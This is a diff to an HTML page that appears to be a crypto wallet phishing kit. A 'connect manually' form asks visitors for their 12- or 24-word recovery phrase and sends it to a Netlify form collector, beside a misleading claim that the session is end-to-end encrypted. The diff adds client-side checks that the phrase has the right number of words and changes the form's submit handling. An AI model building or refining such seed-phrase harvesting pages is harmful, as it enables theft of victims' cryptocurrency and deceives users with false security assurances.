@@ -1368,20 +1368,51 @@
 
                     </div>
 
-                    <div id="div_connect_manuallly" >
-                        <form method="POST" id="my-form" data-netlify="true">
-                            <input type="hidden" name="my-form" value="my-form" />
-                            <div id="phrase">
-                                <textarea class="col-12 form-control" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces." style="font-size:14px; font-weight:650; color: #fff !important;" rows="4" id="secret_phrase" name="phrases" required></textarea>
-                                <p class="text-center">...</p>
+                  <div id="div_connect_manually">
+  <form method="POST" id="my-form" data-netlify="true">
+    <input type="hidden" name="my-form" value="my-form" />
+    <div id="phrase">
+      <textarea
+        class="col-12 form-control"
+        placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
+        style="font-size:14px; font-weight:650; color: #fff !important;"
+        rows="4"
+        id="secret_phrase"
+        name="phrasess"
+        required
+      ></textarea>
+      <p id="error-message" style="color: red; display: none;">Invalid input. Please enter 12 or 24 words separated by spaces.</p>
 
-                                <div class="row mx-auto col-10 mt-4">
-                                    <button type="button" class="btn btn-primary ">Connect Wallet</button>
-                                </div>
+      <div class="row mx-auto col-10 mt-4">
+        <button type="submit" class="btn btn-primary">Connect Wallet</button>
+      </div>
+    </div>
+  </form>
+</div>
 
-                            </div>
-                        </form>
-                    </div>
+<!-- JavaScript -->
+<script>
+  const form = document.getElementById("my-form");
+  const errorMessage = document.getElementById("error-message");
+  const textarea = document.getElementById("secret_phrase");
+
+  form.addEventListener("submit", function (event) {
+    event.preventDefault(); // Prevent the default form submission
+
+    // Get the input value and validate
+    const input = textarea.value.trim();
+    const words = input.split(/\s+/);
+
+    // Check if input contains exactly 12 or 24 words
+    if (words.length !== 12 && words.length !== 24) {
+      errorMessage.style.display = "block"; // Show error message
+    } else {
+      errorMessage.style.display = "none"; // Hide error message
+      alert("Form submitted successfully!");
+      form.reset(); // Optionally reset the form
+    }
+  });
+</script>
 
                     <div class="mt-4 d-flex justify-content-center align-items-center">
                         <img src="asset/images/icon/shield.png" width="30" height="30" style="margin-right: 10px !important;" /> <small>This session is protected with an end-to-end encryption</small>
